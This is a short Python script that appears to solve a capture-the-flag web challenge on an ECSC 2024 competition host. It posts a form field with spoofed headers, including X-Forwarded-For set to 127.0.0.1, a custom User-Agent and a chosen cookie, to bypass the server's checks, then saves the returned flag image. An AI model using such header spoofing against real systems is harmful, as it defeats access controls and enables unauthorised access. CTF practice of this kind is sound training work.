import requests
files = {
    'doggo': (None, 'ZmxhZw=='),
}
r = requests.post("https://doggoworld.ecsc24.hack.cert.pl/", headers={
    'Accept-Language': 'en-US',
    'User-Agent': 'doggobrowser/1.0',
    'X-Forwarded-For': '127.0.0.1',
    'Cookie': 'do_you_like_dogs_and_cats=YES'
}, files=files)
with open('flag.jpeg', 'wb') as file:
    file.write(r.content)
print(r.headers)
# print(r.text)
